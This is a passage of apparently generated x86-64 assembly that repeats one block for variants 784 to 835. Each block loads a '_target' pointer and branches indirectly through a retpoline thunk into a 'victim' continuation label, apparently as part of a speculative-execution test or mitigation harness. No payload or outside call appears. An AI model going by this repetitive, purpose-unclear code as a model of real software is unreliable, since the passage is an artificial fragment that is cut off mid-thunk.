	callq	.Lgg_retpol_thunk_000783
	jmp	.Lgg_retpol_after_000783
.Lgg_retpol_thunk_000783:
	callq	.Lgg_retpol_setup_000783
.Lgg_retpol_cap_000783:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000783
.Lgg_retpol_setup_000783:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000783:
	jmp	.Lvictim_win0_continue
## Variant 784
.Lvictim_win0_var784:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000784
	jmp	.Lgg_retpol_after_000784
.Lgg_retpol_thunk_000784:
	callq	.Lgg_retpol_setup_000784
.Lgg_retpol_cap_000784:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000784
.Lgg_retpol_setup_000784:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000784:
	jmp	.Lvictim_win0_continue
## Variant 785
.Lvictim_win0_var785:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000785
	jmp	.Lgg_retpol_after_000785
.Lgg_retpol_thunk_000785:
	callq	.Lgg_retpol_setup_000785
.Lgg_retpol_cap_000785:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000785
.Lgg_retpol_setup_000785:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000785:
	jmp	.Lvictim_win0_continue
## Variant 786
.Lvictim_win0_var786:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000786
	jmp	.Lgg_retpol_after_000786
.Lgg_retpol_thunk_000786:
	callq	.Lgg_retpol_setup_000786
.Lgg_retpol_cap_000786:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000786
.Lgg_retpol_setup_000786:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000786:
	jmp	.Lvictim_win0_continue
## Variant 787
.Lvictim_win0_var787:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000787
	jmp	.Lgg_retpol_after_000787
.Lgg_retpol_thunk_000787:
	callq	.Lgg_retpol_setup_000787
.Lgg_retpol_cap_000787:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000787
.Lgg_retpol_setup_000787:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000787:
	jmp	.Lvictim_win0_continue
## Variant 788
.Lvictim_win0_var788:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000788
	jmp	.Lgg_retpol_after_000788
.Lgg_retpol_thunk_000788:
	callq	.Lgg_retpol_setup_000788
.Lgg_retpol_cap_000788:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000788
.Lgg_retpol_setup_000788:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000788:
	jmp	.Lvictim_win0_continue
## Variant 789
.Lvictim_win0_var789:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000789
	jmp	.Lgg_retpol_after_000789
.Lgg_retpol_thunk_000789:
	callq	.Lgg_retpol_setup_000789
.Lgg_retpol_cap_000789:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000789
.Lgg_retpol_setup_000789:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000789:
	jmp	.Lvictim_win0_continue
## Variant 790
.Lvictim_win0_var790:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000790
	jmp	.Lgg_retpol_after_000790
.Lgg_retpol_thunk_000790:
	callq	.Lgg_retpol_setup_000790
.Lgg_retpol_cap_000790:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000790
.Lgg_retpol_setup_000790:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000790:
	jmp	.Lvictim_win0_continue
## Variant 791
.Lvictim_win0_var791:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000791
	jmp	.Lgg_retpol_after_000791
.Lgg_retpol_thunk_000791:
	callq	.Lgg_retpol_setup_000791
.Lgg_retpol_cap_000791:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000791
.Lgg_retpol_setup_000791:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000791:
	jmp	.Lvictim_win0_continue
## Variant 792
.Lvictim_win0_var792:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000792
	jmp	.Lgg_retpol_after_000792
.Lgg_retpol_thunk_000792:
	callq	.Lgg_retpol_setup_000792
.Lgg_retpol_cap_000792:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000792
.Lgg_retpol_setup_000792:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000792:
	jmp	.Lvictim_win0_continue
## Variant 793
.Lvictim_win0_var793:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000793
	jmp	.Lgg_retpol_after_000793
.Lgg_retpol_thunk_000793:
	callq	.Lgg_retpol_setup_000793
.Lgg_retpol_cap_000793:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000793
.Lgg_retpol_setup_000793:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000793:
	jmp	.Lvictim_win0_continue
## Variant 794
.Lvictim_win0_var794:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000794
	jmp	.Lgg_retpol_after_000794
.Lgg_retpol_thunk_000794:
	callq	.Lgg_retpol_setup_000794
.Lgg_retpol_cap_000794:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000794
.Lgg_retpol_setup_000794:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000794:
	jmp	.Lvictim_win0_continue
## Variant 795
.Lvictim_win0_var795:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000795
	jmp	.Lgg_retpol_after_000795
.Lgg_retpol_thunk_000795:
	callq	.Lgg_retpol_setup_000795
.Lgg_retpol_cap_000795:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000795
.Lgg_retpol_setup_000795:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000795:
	jmp	.Lvictim_win0_continue
## Variant 796
.Lvictim_win0_var796:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000796
	jmp	.Lgg_retpol_after_000796
.Lgg_retpol_thunk_000796:
	callq	.Lgg_retpol_setup_000796
.Lgg_retpol_cap_000796:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000796
.Lgg_retpol_setup_000796:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000796:
	jmp	.Lvictim_win0_continue
## Variant 797
.Lvictim_win0_var797:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000797
	jmp	.Lgg_retpol_after_000797
.Lgg_retpol_thunk_000797:
	callq	.Lgg_retpol_setup_000797
.Lgg_retpol_cap_000797:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000797
.Lgg_retpol_setup_000797:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000797:
	jmp	.Lvictim_win0_continue
## Variant 798
.Lvictim_win0_var798:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000798
	jmp	.Lgg_retpol_after_000798
.Lgg_retpol_thunk_000798:
	callq	.Lgg_retpol_setup_000798
.Lgg_retpol_cap_000798:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000798
.Lgg_retpol_setup_000798:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000798:
	jmp	.Lvictim_win0_continue
## Variant 799
.Lvictim_win0_var799:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000799
	jmp	.Lgg_retpol_after_000799
.Lgg_retpol_thunk_000799:
	callq	.Lgg_retpol_setup_000799
.Lgg_retpol_cap_000799:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000799
.Lgg_retpol_setup_000799:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000799:
	jmp	.Lvictim_win0_continue
## Variant 800
.Lvictim_win0_var800:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000800
	jmp	.Lgg_retpol_after_000800
.Lgg_retpol_thunk_000800:
	callq	.Lgg_retpol_setup_000800
.Lgg_retpol_cap_000800:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000800
.Lgg_retpol_setup_000800:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000800:
	jmp	.Lvictim_win0_continue
## Variant 801
.Lvictim_win0_var801:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000801
	jmp	.Lgg_retpol_after_000801
.Lgg_retpol_thunk_000801:
	callq	.Lgg_retpol_setup_000801
.Lgg_retpol_cap_000801:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000801
.Lgg_retpol_setup_000801:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000801:
	jmp	.Lvictim_win0_continue
## Variant 802
.Lvictim_win0_var802:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000802
	jmp	.Lgg_retpol_after_000802
.Lgg_retpol_thunk_000802:
	callq	.Lgg_retpol_setup_000802
.Lgg_retpol_cap_000802:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000802
.Lgg_retpol_setup_000802:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000802:
	jmp	.Lvictim_win0_continue
## Variant 803
.Lvictim_win0_var803:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000803
	jmp	.Lgg_retpol_after_000803
.Lgg_retpol_thunk_000803:
	callq	.Lgg_retpol_setup_000803
.Lgg_retpol_cap_000803:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000803
.Lgg_retpol_setup_000803:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000803:
	jmp	.Lvictim_win0_continue
## Variant 804
.Lvictim_win0_var804:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000804
	jmp	.Lgg_retpol_after_000804
.Lgg_retpol_thunk_000804:
	callq	.Lgg_retpol_setup_000804
.Lgg_retpol_cap_000804:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000804
.Lgg_retpol_setup_000804:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000804:
	jmp	.Lvictim_win0_continue
## Variant 805
.Lvictim_win0_var805:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000805
	jmp	.Lgg_retpol_after_000805
.Lgg_retpol_thunk_000805:
	callq	.Lgg_retpol_setup_000805
.Lgg_retpol_cap_000805:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000805
.Lgg_retpol_setup_000805:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000805:
	jmp	.Lvictim_win0_continue
## Variant 806
.Lvictim_win0_var806:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000806
	jmp	.Lgg_retpol_after_000806
.Lgg_retpol_thunk_000806:
	callq	.Lgg_retpol_setup_000806
.Lgg_retpol_cap_000806:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000806
.Lgg_retpol_setup_000806:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000806:
	jmp	.Lvictim_win0_continue
## Variant 807
.Lvictim_win0_var807:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000807
	jmp	.Lgg_retpol_after_000807
.Lgg_retpol_thunk_000807:
	callq	.Lgg_retpol_setup_000807
.Lgg_retpol_cap_000807:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000807
.Lgg_retpol_setup_000807:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000807:
	jmp	.Lvictim_win0_continue
## Variant 808
.Lvictim_win0_var808:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000808
	jmp	.Lgg_retpol_after_000808
.Lgg_retpol_thunk_000808:
	callq	.Lgg_retpol_setup_000808
.Lgg_retpol_cap_000808:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000808
.Lgg_retpol_setup_000808:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000808:
	jmp	.Lvictim_win0_continue
## Variant 809
.Lvictim_win0_var809:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000809
	jmp	.Lgg_retpol_after_000809
.Lgg_retpol_thunk_000809:
	callq	.Lgg_retpol_setup_000809
.Lgg_retpol_cap_000809:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000809
.Lgg_retpol_setup_000809:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000809:
	jmp	.Lvictim_win0_continue
## Variant 810
.Lvictim_win0_var810:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000810
	jmp	.Lgg_retpol_after_000810
.Lgg_retpol_thunk_000810:
	callq	.Lgg_retpol_setup_000810
.Lgg_retpol_cap_000810:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000810
.Lgg_retpol_setup_000810:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000810:
	jmp	.Lvictim_win0_continue
## Variant 811
.Lvictim_win0_var811:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000811
	jmp	.Lgg_retpol_after_000811
.Lgg_retpol_thunk_000811:
	callq	.Lgg_retpol_setup_000811
.Lgg_retpol_cap_000811:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000811
.Lgg_retpol_setup_000811:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000811:
	jmp	.Lvictim_win0_continue
## Variant 812
.Lvictim_win0_var812:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000812
	jmp	.Lgg_retpol_after_000812
.Lgg_retpol_thunk_000812:
	callq	.Lgg_retpol_setup_000812
.Lgg_retpol_cap_000812:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000812
.Lgg_retpol_setup_000812:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000812:
	jmp	.Lvictim_win0_continue
## Variant 813
.Lvictim_win0_var813:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000813
	jmp	.Lgg_retpol_after_000813
.Lgg_retpol_thunk_000813:
	callq	.Lgg_retpol_setup_000813
.Lgg_retpol_cap_000813:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000813
.Lgg_retpol_setup_000813:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000813:
	jmp	.Lvictim_win0_continue
## Variant 814
.Lvictim_win0_var814:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000814
	jmp	.Lgg_retpol_after_000814
.Lgg_retpol_thunk_000814:
	callq	.Lgg_retpol_setup_000814
.Lgg_retpol_cap_000814:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000814
.Lgg_retpol_setup_000814:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000814:
	jmp	.Lvictim_win0_continue
## Variant 815
.Lvictim_win0_var815:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000815
	jmp	.Lgg_retpol_after_000815
.Lgg_retpol_thunk_000815:
	callq	.Lgg_retpol_setup_000815
.Lgg_retpol_cap_000815:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000815
.Lgg_retpol_setup_000815:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000815:
	jmp	.Lvictim_win0_continue
## Variant 816
.Lvictim_win0_var816:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000816
	jmp	.Lgg_retpol_after_000816
.Lgg_retpol_thunk_000816:
	callq	.Lgg_retpol_setup_000816
.Lgg_retpol_cap_000816:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000816
.Lgg_retpol_setup_000816:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000816:
	jmp	.Lvictim_win0_continue
## Variant 817
.Lvictim_win0_var817:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000817
	jmp	.Lgg_retpol_after_000817
.Lgg_retpol_thunk_000817:
	callq	.Lgg_retpol_setup_000817
.Lgg_retpol_cap_000817:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000817
.Lgg_retpol_setup_000817:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000817:
	jmp	.Lvictim_win0_continue
## Variant 818
.Lvictim_win0_var818:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000818
	jmp	.Lgg_retpol_after_000818
.Lgg_retpol_thunk_000818:
	callq	.Lgg_retpol_setup_000818
.Lgg_retpol_cap_000818:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000818
.Lgg_retpol_setup_000818:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000818:
	jmp	.Lvictim_win0_continue
## Variant 819
.Lvictim_win0_var819:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000819
	jmp	.Lgg_retpol_after_000819
.Lgg_retpol_thunk_000819:
	callq	.Lgg_retpol_setup_000819
.Lgg_retpol_cap_000819:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000819
.Lgg_retpol_setup_000819:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000819:
	jmp	.Lvictim_win0_continue
## Variant 820
.Lvictim_win0_var820:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000820
	jmp	.Lgg_retpol_after_000820
.Lgg_retpol_thunk_000820:
	callq	.Lgg_retpol_setup_000820
.Lgg_retpol_cap_000820:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000820
.Lgg_retpol_setup_000820:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000820:
	jmp	.Lvictim_win0_continue
## Variant 821
.Lvictim_win0_var821:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000821
	jmp	.Lgg_retpol_after_000821
.Lgg_retpol_thunk_000821:
	callq	.Lgg_retpol_setup_000821
.Lgg_retpol_cap_000821:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000821
.Lgg_retpol_setup_000821:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000821:
	jmp	.Lvictim_win0_continue
## Variant 822
.Lvictim_win0_var822:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000822
	jmp	.Lgg_retpol_after_000822
.Lgg_retpol_thunk_000822:
	callq	.Lgg_retpol_setup_000822
.Lgg_retpol_cap_000822:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000822
.Lgg_retpol_setup_000822:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000822:
	jmp	.Lvictim_win0_continue
## Variant 823
.Lvictim_win0_var823:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000823
	jmp	.Lgg_retpol_after_000823
.Lgg_retpol_thunk_000823:
	callq	.Lgg_retpol_setup_000823
.Lgg_retpol_cap_000823:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000823
.Lgg_retpol_setup_000823:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000823:
	jmp	.Lvictim_win0_continue
## Variant 824
.Lvictim_win0_var824:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000824
	jmp	.Lgg_retpol_after_000824
.Lgg_retpol_thunk_000824:
	callq	.Lgg_retpol_setup_000824
.Lgg_retpol_cap_000824:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000824
.Lgg_retpol_setup_000824:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000824:
	jmp	.Lvictim_win0_continue
## Variant 825
.Lvictim_win0_var825:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000825
	jmp	.Lgg_retpol_after_000825
.Lgg_retpol_thunk_000825:
	callq	.Lgg_retpol_setup_000825
.Lgg_retpol_cap_000825:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000825
.Lgg_retpol_setup_000825:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000825:
	jmp	.Lvictim_win0_continue
## Variant 826
.Lvictim_win0_var826:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000826
	jmp	.Lgg_retpol_after_000826
.Lgg_retpol_thunk_000826:
	callq	.Lgg_retpol_setup_000826
.Lgg_retpol_cap_000826:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000826
.Lgg_retpol_setup_000826:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000826:
	jmp	.Lvictim_win0_continue
## Variant 827
.Lvictim_win0_var827:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000827
	jmp	.Lgg_retpol_after_000827
.Lgg_retpol_thunk_000827:
	callq	.Lgg_retpol_setup_000827
.Lgg_retpol_cap_000827:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000827
.Lgg_retpol_setup_000827:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000827:
	jmp	.Lvictim_win0_continue
## Variant 828
.Lvictim_win0_var828:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000828
	jmp	.Lgg_retpol_after_000828
.Lgg_retpol_thunk_000828:
	callq	.Lgg_retpol_setup_000828
.Lgg_retpol_cap_000828:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000828
.Lgg_retpol_setup_000828:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000828:
	jmp	.Lvictim_win0_continue
## Variant 829
.Lvictim_win0_var829:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000829
	jmp	.Lgg_retpol_after_000829
.Lgg_retpol_thunk_000829:
	callq	.Lgg_retpol_setup_000829
.Lgg_retpol_cap_000829:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000829
.Lgg_retpol_setup_000829:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000829:
	jmp	.Lvictim_win0_continue
## Variant 830
.Lvictim_win0_var830:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000830
	jmp	.Lgg_retpol_after_000830
.Lgg_retpol_thunk_000830:
	callq	.Lgg_retpol_setup_000830
.Lgg_retpol_cap_000830:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000830
.Lgg_retpol_setup_000830:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000830:
	jmp	.Lvictim_win0_continue
## Variant 831
.Lvictim_win0_var831:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000831
	jmp	.Lgg_retpol_after_000831
.Lgg_retpol_thunk_000831:
	callq	.Lgg_retpol_setup_000831
.Lgg_retpol_cap_000831:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000831
.Lgg_retpol_setup_000831:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000831:
	jmp	.Lvictim_win0_continue
## Variant 832
.Lvictim_win0_var832:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000832
	jmp	.Lgg_retpol_after_000832
.Lgg_retpol_thunk_000832:
	callq	.Lgg_retpol_setup_000832
.Lgg_retpol_cap_000832:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000832
.Lgg_retpol_setup_000832:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000832:
	jmp	.Lvictim_win0_continue
## Variant 833
.Lvictim_win0_var833:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000833
	jmp	.Lgg_retpol_after_000833
.Lgg_retpol_thunk_000833:
	callq	.Lgg_retpol_setup_000833
.Lgg_retpol_cap_000833:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000833
.Lgg_retpol_setup_000833:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000833:
	jmp	.Lvictim_win0_continue
## Variant 834
.Lvictim_win0_var834:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000834
	jmp	.Lgg_retpol_after_000834
.Lgg_retpol_thunk_000834:
	callq	.Lgg_retpol_setup_000834
.Lgg_retpol_cap_000834:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000834
.Lgg_retpol_setup_000834:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000834:
	jmp	.Lvictim_win0_continue
## Variant 835
.Lvictim_win0_var835:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000835
	jmp	.Lgg_retpol_after_000835
.Lgg_retpol_thunk_000835:
